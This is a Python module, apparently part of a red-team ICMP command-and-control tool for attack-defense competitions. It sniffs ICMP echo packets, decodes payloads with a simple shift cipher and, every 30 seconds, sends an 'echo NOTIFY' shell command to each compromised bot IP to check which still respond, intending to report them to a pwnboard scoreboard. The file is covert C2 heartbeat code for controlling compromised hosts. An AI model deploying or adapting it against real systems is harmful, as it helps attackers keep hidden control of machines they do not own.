"""
This file can be run individually. It notifies https://github.com/micahjmartin/pwnboard with the bots' status.

Author: Mohammed Alshehri
Site: Mohad.red
"""


from Config import *
from Common import *
from Packets import *
from scapy.all import *

# This word will be echoed by this Agent.
# If we get a reply with the same word, that means it's still alive.
THEWORD = "NOTIFY"

# Delay time in seconds
DTIME = 30


"""
This function sniffs for THEWORD in all icmplike pkts
"""
def pkt_callback(pkt):
    packet = pkt
    # Since the client sends back the "output" in a type 8 ICMP packet.
    if str(packet.getlayer(ICMP).type) == "8":
        try:
            ip = str(packet[IP].src).strip()
            data = packet[Raw].load
            # Don't forget the "encryption" lol
            data = shift(data, -1, sender = False)
            if THEWORD in data:
                print(ip+" is alive, notifying pwnboard.win")
                #sendUpdate(ip)
        except:
            if debug:
                print("Failed to read pkt_callback()")

"""
Live sniff.
"""
def listen():
    pkts = sniff(iface=BLUE_TEAM_INTERFACE,filter="icmp", prn=pkt_callback, store=0)


def run():
    loadIPs()
    # In this case 'urls' is a list of urls to be crawled.
    t = Thread(target=listen, args=[])
    # To allow Control + C
    t.daemon = True
    # Start listening for responses
    t.start()
    while 1:
        for IP in listOfIPs:
            SendIt(IP, "echo "+THEWORD)
        time.sleep(DTIME)

if __name__ == '__main__':
    run()